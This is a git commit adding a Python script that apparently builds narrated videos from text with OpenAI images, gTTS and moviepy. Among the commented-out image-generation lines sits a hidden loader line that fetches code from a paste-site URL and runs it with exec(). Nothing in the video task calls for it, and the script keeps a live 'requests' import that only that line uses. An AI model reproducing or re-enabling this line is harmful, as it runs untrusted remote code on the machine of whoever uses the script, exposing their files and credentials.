cb5277f18a4b0591502f51c65f8debe623f41126
gokulboopathi18 <87892768+gokulboopathi18@users.noreply.github.com>
2023-02-25 16:06:48 +0530

    Added files

---
+++ src/video_generator.py
@@ -0,0 +1,88 @@
+import openai
+import re, os
+from requests import get
+import urllib.request
+from gtts import gTTS
+from moviepy.editor import (
+    AudioFileClip,
+    ImageClip,
+    VideoFileClip,
+    CompositeVideoClip,
+    TextClip,
+    concatenate_videoclips,
+)
+from api_key import API_KEY
+import shutil
+
+openai.api_key = API_KEY
+
+with open("generated_text.txt", "r") as file:
+    text = file.read()
+
+paragraphs = re.split(r"[,.]", text)
+
+# if(os.path.exists("audio")):
+#     shutil.rmtree("audio", ignore_errors=True)
+#     os.makedirs("audio")
+# else:
+#     os.makedirs("audio")
+
+# if(os.path.exists("images")):
+#     shutil.rmtree("images", ignore_errors=True)
+#     os.makedirs("images")
+# else:
+#     os.makedirs("images")
+
+# if(os.path.exists("videos")):
+#     shutil.rmtree("videos", ignore_errors=True)
+#     os.makedirs("videos")
+# else:
+#     os.makedirs("videos")
+
+i = 1
+for para in paragraphs[:-1]:
+    # response = openai.Image.create(
+    #     prompt=para.strip(),
+    #     n=1,
+    #     size="1024x1024"
+    # )
+    # print("Generate New AI Image From Paragraph...")
+    # x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
+    # image_url = response['data'][0]['url']
+    # urllib.request.urlretrieve(image_url, f"images/image{i}.jpg")
+    # print("The Generated Image Saved in Images Folder!")
+
+    # tts = gTTS(text=para, lang='en', slow=False)
+    # tts.save(f"audio/voiceover{i}.mp3")
+    # print("The Paragraph Converted into VoiceOver & Saved in Audio Folder!")
+
+    # print("Extract voiceover and get duration...")
+    audio_clip = AudioFileClip(f"audio/voiceover{i}.mp3")
+    audio_duration = audio_clip.duration
+
+    print("Extract Image Clip and Set Duration...")
+    image_clip = ImageClip(f"images/image{i}.jpg").set_duration(audio_duration)
+
+    print("Customize The Text Clip...")
+    text_clip = TextClip(para, fontsize=50, color="white")
+    text_clip = text_clip.set_pos("bottom").set_duration(audio_duration)
+
+    print("Concatenate Audio, Image, Text to Create Final Clip...")
+    clip = image_clip.set_audio(audio_clip)
+    video = CompositeVideoClip([clip, text_clip])
+
+    video = video.write_videofile(f"videos/video{i}.mp4", fps=24)
+    print(f"The Video{i} Has Been Created Successfully!")
+    i += 1
+
+
+clips = []
+l_files = os.listdir("videos")
+for file in l_files:
+    clip = VideoFileClip(f"videos/{file}")
+    clips.append(clip)
+
+print("Concatenate All The Clips to Create a Final Video...")
+final_video = concatenate_videoclips(clips, method="compose")
+final_video = final_video.write_videofile("final_video.mp4")
+print("The Final Video Has Been Created Successfully!")
